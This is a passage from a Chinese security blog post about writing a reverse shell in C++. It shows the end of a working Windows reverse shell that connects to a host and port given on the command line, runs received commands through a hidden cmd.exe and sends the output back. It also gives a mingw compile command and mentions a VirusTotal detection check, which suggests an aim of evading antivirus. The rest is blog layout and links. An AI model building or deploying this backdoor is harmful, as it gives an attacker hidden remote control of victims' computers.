&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			char RecvData[DEFAULT_BUFLEN];</span><br><span class="line">			memset(RecvData, 0, sizeof(RecvData));</span><br><span class="line">			int RecvCode = recv(ShellSock, RecvData, DEFAULT_BUFLEN, 0);</span><br><span class="line">			if (RecvCode&lt;=0) &#123;</span><br><span class="line">				closesocket(ShellSock);</span><br><span class="line">				WSACleanup();</span><br><span class="line">				continue;</span><br><span class="line">			&#125;</span><br><span class="line">			else</span><br><span class="line">			&#123;</span><br><span class="line">				HANDLE hReadPipe = NULL;</span><br><span class="line">				HANDLE hWritePipe = NULL;</span><br><span class="line">				SECURITY_ATTRIBUTES securityAttributes = &#123; 0 &#125;;</span><br><span class="line">				BOOL bRet = FALSE;</span><br><span class="line">				STARTUPINFO si = &#123; 0 &#125;;</span><br><span class="line">				char command[] = &quot;cmd.exe /c &quot;;</span><br><span class="line">				PROCESS_INFORMATION pi = &#123; 0 &#125;;</span><br><span class="line">				char pszResultBuffer[DEFAULT_BUFLEN];</span><br><span class="line">				securityAttributes.bInheritHandle = TRUE;</span><br><span class="line">				securityAttributes.nLength = sizeof(securityAttributes);</span><br><span class="line">				securityAttributes.lpSecurityDescriptor = NULL;</span><br><span class="line">				bRet = ::CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;securityAttributes, 0);</span><br><span class="line">				si.cb = sizeof(si);</span><br><span class="line">				si.hStdError = hWritePipe;</span><br><span class="line">				si.hStdOutput = hWritePipe;</span><br><span class="line">				si.wShowWindow = SW_HIDE;</span><br><span class="line">				si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">				strcat(command, RecvData);</span><br><span class="line">				bRet = ::CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi);</span><br><span class="line">				::WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line">				::WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">				memset(pszResultBuffer, 0, sizeof(pszResultBuffer));</span><br><span class="line">				::ReadFile(hReadPipe, pszResultBuffer, DEFAULT_BUFLEN, NULL, NULL);</span><br><span class="line">				::CloseHandle(pi.hThread);</span><br><span class="line">				::CloseHandle(pi.hProcess);</span><br><span class="line">				::CloseHandle(hWritePipe);</span><br><span class="line">				::CloseHandle(hReadPipe);</span><br><span class="line">				send(ShellSock, pszResultBuffer, DEFAULT_BUFLEN, 0);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">	int port = atoi(argv[2]);</span><br><span class="line">	RunShell(argv[1],port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用下面的方式编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i686-w64-mingw32-g++ 2.cpp -o 2.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc</span><br></pre></td></tr></table></figure>
+<p>执行效果如下：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbibolh4lwj30c8052jr5.jpg" alt="1.png"></p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBly1gbibotk9ovj30hn08rtak.jpg" alt="2.png"></p>
+<p>vt检测：</p>
+<p><img src="http://ww1.sinaimg.cn/large/007F8GgBgy1gbibrosixfj310r0o276k.jpg" alt="3.png"></p>
+<p>参考文章：</p>
+<p><a href="https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/" target="_blank" rel="noopener">https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/</a></p>
+<p><a href="https://www.codeleading.com/article/1126284392/" target="_blank" rel="noopener">https://www.codeleading.com/article/1126284392/</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/cshell/">自己编写反弹shell代码</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 冷逸 的个人博客">冷逸</a></p>
+  <p><span>发布时间:</span>2020年02月21日 - 10:02</p>
+  <p><span>最后更新:</span>2020年02月21日 - 10:02</p>
+  <p><span>原始链接:</span><a href="/cshell/" title="自己编写反弹shell代码">https://lengjibo.github.io/cshell/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://lengjibo.github.io/cshell/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+    $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+    });
+    });  
+</script>
+
+
+      
+    </div>
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #555;font-size:14px;">-------------The End-------------</div>
+    
+</div>
+
+      
+    </div>
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.png" alt="冷逸 WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/zhifubao.jpg" alt="冷逸 Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/c/" rel="tag"><i class="fa fa-tag"></i> c++</a>
+          
+        </div>
+      
+
+      
+      
+        <div class="post-widgets">
+        
+
+        
+
+        
+          
+          <div class="social_share">
+            
+               <div>
+                 
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+               </div>
+            
+            
+          </div>
+        
+        </div>
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/css/" rel="next" title="Cobalt Strike插件编写">
+                <i class="fa fa-chevron-left"></i> Cobalt Strike插件编写
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/execl/" rel="prev" title="execl钓鱼">
+                execl钓鱼 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="http://ww1.sinaimg.cn/large/007F8GgBly1g7vony4ltaj308w08wq30.jpg"
+                alt="冷逸" />
+            
+              <p class="site-author-name" itemprop="name">冷逸</p>
+              <p class="site-description motion-element" itemprop="description">做一个温柔的人...</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">85</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">109</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/../../.deploy_git/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/lengjibo" target="_blank" title="GitHub"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="qqlengyi@163.com" target="_blank" title="E-Mail"><i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  
+                </span>
+              
+            </div>
+          
+        <div id="music163player">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=110 src="https://music.163.com/outchain/player?type=0&id=377079922&auto=1&height=90"></iframe>
+          </div>
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.zfsec.cn/" title="青春's blog" target="_blank">青春's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.addon.pub/" title="Yokeen's blog" target="_blank">Yokeen's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://freeerror.org/" title="之乎者也's blog" target="_blank">之乎者也's blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.bugbank.cn/team/FrigidSword" title="漏洞银行" target="_blank">漏洞银行</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.vulbox.com/team/Frigid%20Sword%E5%AE%89%E5%85%A8%E5%9B%A2%E9%98%9F" title="漏洞盒子" target="_blank">漏洞盒子</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://godpang.github.io/" title="Mr.赵" target="_blank">Mr.赵</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://amliaw4.github.io/" title="amliaW4'S Blog" target="_blank">amliaW4'S Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.se7ensec.cn/" title="se7en's Blog" target="_blank">se7en's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ninjia.gitbook.io/secskill/" title="secskill" target="_blank">secskill</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.bug1024.cn/" title="ibug" target="_blank">ibug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://wwcx.org/" title="Strjziny's Blog" target="_blank">Strjziny's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">冷逸</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Muse</a> v6.4.0</div>
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv" title="Total Visitors">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+
+  
+    <span class="site-pv" title="Total Views">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/three/canvas_sphere.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/src/love.js"></script>
